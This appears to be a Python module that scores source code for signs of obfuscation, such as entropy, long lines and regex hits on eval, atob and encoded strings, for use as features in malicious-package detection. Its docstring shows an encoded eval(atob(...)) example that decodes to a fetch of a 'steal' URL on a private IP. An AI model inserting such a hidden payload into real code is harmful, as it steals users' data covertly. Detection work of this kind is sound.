
"""
Static code analysis for obfuscation and unusual minification.

Malicious packages often hide their payload, for example:

    eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4wLjAuMS9zdGVhbCcp..."))

Obfuscated code looks different from normal code:
  * higher "randomness" of characters (Shannon entropy)
  * very long lines
  * long base64 / hex strings
  * dynamic code execution (eval, exec, Function(...))

This module measures those properties on the source text. It does NOT
run the code.
"""

import math
import re
from collections import Counter


# Regular expressions for common obfuscation tricks in JavaScript and
# Python packages. Each match counts as one "indicator".
OBFUSCATION_PATTERNS = {
    "dynamic_eval": re.compile(r"\beval\s*\(|\bnew\s+Function\s*\(|\bexec\s*\("),
    "base64_decode": re.compile(r"\batob\s*\(|b64decode\s*\(|Buffer\.from\([^)]*['\"]base64['\"]"),
    "char_code_building": re.compile(r"String\.fromCharCode|\bchr\s*\(\s*\d+\s*\)"),
    "hex_escapes": re.compile(r"(?:\\x[0-9a-fA-F]{2}){8,}"),
    "long_encoded_string": re.compile(r"['\"][A-Za-z0-9+/=]{120,}['\"]"),
    "compile_marshal": re.compile(r"\bmarshal\.loads\s*\(|\bzlib\.decompress\s*\("),
}


def shannon_entropy(text):
    """
    Average number of bits of information per character.

    Normal source code: roughly 4.0 - 5.0
    Packed/encoded data: often above 5.5
    """

    if not text:
        return 0.0

    counts = Counter(text)
    total = len(text)

    return -sum(
        (count / total) * math.log2(count / total)
        for count in counts.values()
    )


def analyze_code(code):
    """
    Measure obfuscation-related properties of a source code string.

    Returns a dictionary of plain numbers so the result can be used
    directly as ML features.
    """

    if not code:
        return {
            "entropy": 0.0,
            "max_line_length": 0,
            "long_line_ratio": 0.0,
            "obfuscation_indicators": 0,
            "matched_patterns": [],
        }

    lines = code.splitlines() or [code]
    line_lengths = [len(line) for line in lines]

    # A line longer than 500 characters is typical for minified or
    # packed code, and rare in hand-written code.
    long_lines = sum(1 for length in line_lengths if length > 500)

    matched_patterns = []
    indicator_count = 0

    for name, pattern in OBFUSCATION_PATTERNS.items():
        matches = len(pattern.findall(code))

        if matches:
            matched_patterns.append(name)
            indicator_count += matches

    return {
        "entropy": round(shannon_entropy(code), 4),
        "max_line_length": max(line_lengths),
        "long_line_ratio": round(long_lines / len(lines), 4),
        "obfuscation_indicators": indicator_count,
        "matched_patterns": matched_patterns,
    }
